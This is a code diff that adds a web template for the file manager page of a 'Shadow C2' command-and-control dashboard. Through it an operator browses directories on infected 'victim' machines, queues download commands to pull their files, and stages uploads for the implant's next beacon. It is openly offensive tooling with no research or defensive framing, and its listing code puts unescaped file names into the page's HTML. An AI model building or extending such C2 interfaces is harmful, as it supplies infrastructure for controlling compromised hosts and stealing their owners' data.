@@ -1,0 +1,80 @@
+{% extends "base.html" %}
+{% block title %}Shadow C2 — Files{% endblock %}
+{% block page_title %}📁 File Manager — {{ victim.hostname or victim.ip }}{% endblock %}
+
+{% block content %}
+<div class="file-manager">
+    <div class="fm-toolbar">
+        <input type="text" id="fm-path" class="input-dark input-lg" value="/" placeholder="/var/www/html">
+        <button onclick="browsePath()" class="btn btn-primary">Browse</button>
+        <button onclick="browsePath(getParentDir())" class="btn btn-secondary">⬆️ Up</button>
+    </div>
+    <div class="fm-content">
+        <table class="data-table" id="fm-table">
+            <thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr></thead>
+            <tbody id="fm-body"><tr><td colspan="6">Enter a path and click Browse</td></tr></tbody>
+        </table>
+    </div>
+    <!-- Upload -->
+    <div class="panel" style="margin-top:20px;">
+        <div class="panel-header"><h3>Upload File</h3></div>
+        <div class="upload-form">
+            <input type="text" id="upload-path" class="input-dark" placeholder="Remote path: /var/www/html/file.txt">
+            <input type="file" id="upload-file" class="input-dark">
+            <button onclick="uploadFile()" class="btn btn-primary">📤 Upload</button>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+const victimId = {{ victim_id }};
+function browsePath(path) {
+    if(path === undefined) path = document.getElementById('fm-path').value;
+    document.getElementById('fm-path').value = path;
+    fetch('/dashboard/api/command', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({victim_id: victimId, command: `__ls__${path}`})
+    }).then(r => r.json()).then(d => showNotification('Browse command queued'));
+}
+
+function getParentDir() {
+    const p = document.getElementById('fm-path').value;
+    return p.split('/').slice(0, -1).join('/') || '/';
+}
+
+socket.on('command_result', (data) => {
+    try {
+        const files = JSON.parse(data.output);
+        if(Array.isArray(files)) {
+            let html = '';
+            files.forEach(f => {
+                const icon = f.type === 'd' ? '📁' : '📄';
+                html += `<tr>
+                    <td>${icon} ${f.type === 'd' ? `<a href="#" onclick="browsePath('${document.getElementById('fm-path').value}/${f.name}')">${f.name}</a>` : f.name}</td>
+                    <td>${f.type === 'd' ? 'Directory' : 'File'}</td>
+                    <td>${f.size || '—'}</td><td>${f.perms || '—'}</td><td>${f.modified || '—'}</td>
+                    <td>${f.type === 'f' ? `<button onclick="downloadFile('${document.getElementById('fm-path').value}/${f.name}')" class="btn btn-sm btn-primary">📥</button>` : ''}</td>
+                </tr>`;
+            });
+            document.getElementById('fm-body').innerHTML = html;
+        }
+    } catch(e) {}
+});
+
+function downloadFile(path) {
+    fetch('/dashboard/api/command', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({victim_id: victimId, command: `__download__${path}`})
+    }).then(() => showNotification('Download queued'));
+}
+
+function uploadFile() {
+    const fileInput = document.getElementById('upload-file');
+    const remotePath = document.getElementById('upload-path').value;
+    if(!fileInput.files.length || !remotePath) return;
+    showNotification('Upload queued (will be sent on next beacon)');
+}
+</script>
+{% endblock %}
